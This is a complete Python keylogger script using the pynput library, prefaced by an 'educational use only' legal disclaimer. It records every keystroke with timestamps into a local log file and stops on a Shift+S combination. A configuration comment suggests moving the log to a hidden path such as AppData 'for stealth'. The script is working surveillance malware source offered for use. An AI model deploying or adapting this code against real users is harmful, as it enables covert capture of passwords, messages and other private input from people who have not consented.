# =============================================================
# Python Keylogger - Educational Use Only
#
# WARNING: Unauthorized use of keyloggers is illegal and unethical.
# Use ONLY in controlled, explicit-consent environments (e.g., your own computer, labs).
# You are responsible for complying with all applicable laws.
# Posting this code is for learning and demonstration purposes ONLY.
# =============================================================



import pynput
from pynput import keyboard
import logging
import os

# ---------- Configuration ----------
# Define the file where logs will be saved.
# For stealth, this could be a more hidden path, e.g., in AppData or a temporary folder.
LOG_FILE = "key_log.txt"


# ---------- Setup Logging ----------
# We use Python's logging module to easily write to a file.
# The format includes a timestamp for each logged key.
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

print("---------- Keylogger Started ----------")
print(f"[*] Logging keystrokes to {os.path.abspath(LOG_FILE)}")
print("[!] Press 'shift+S' to stop the logger.")

# ---------- Core Logic ----------

buffer = ""
pressed_keys = set()

def on_press(key):
    """
    This function is a callback that executes every time a key is pressed.
    """
    global buffer
    pressed_keys.add(key)

    try:
        key_name = str(key).replace("Key.", "")

        # For alphanumeric keys, we can log the character directly.
        # The key.char attribute holds the character representation.
        if hasattr(key, 'char') and key.char is not None:
            buffer += key.char

        # For special keys (e.g., Shift, Ctrl, Space, Enter), key.char does not exist.
        # We handle these separately by logging the key's name.
        elif key == keyboard.Key.space or key == keyboard.Key.enter:
            if buffer:
                logging.info(buffer)
                buffer = ""
            if key == keyboard.Key.enter:
                logging.info("[ENTER]")
            if key == keyboard.Key.space:
                logging.info("[SPACE]")
        elif key == keyboard.Key.backspace:
            buffer = buffer[:-1]
        elif key == keyboard.Key.shift:
            logging.info("[SHIFT]")  
        else:
            logging.info(f"Special key pressed: [{key_name.upper()}]")          
            


    except Exception as e:
        
        logging.error(f"[ERROR] {str(e)}")

    # ---------- Stop combo: Shift + S ----------
    if (keyboard.Key.shift in pressed_keys or
        keyboard.Key.shift_l in pressed_keys or
        keyboard.Key.shift_r in pressed_keys):
        if key == keyboard.KeyCode.from_char('S'):
            if buffer:
                logging.info(buffer)
            logging.info("Keylogger stopped (Shift+S pressed).")
            print("\n[*] Keylogger stopped by Shift+S.")
            return False


# ---------- ON_RELEASE FUNCTION ----------
def on_release(key):
    """
    This function is a callback that executes every time a key is released.
    We are using it here primarily to detect the 'Esc' key to stop the logger.
    """
    # if key == pynput.keyboard.Key.esc:
    #     # Stop listener
    #     return False
    pressed_keys.discard(key)

if __name__ == "__main__":
    # ---------- Main Execution Block ----------

    # The Listener object monitors all keyboard events.
    # We pass our on_press function to it. It will be called for every key press.
    # The 'with' statement ensures the listener is properly managed.
    with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        # listener.join() blocks the script from exiting, keeping the listener active.
        listener.join()

    print("---------- Keylogger Terminated ----------")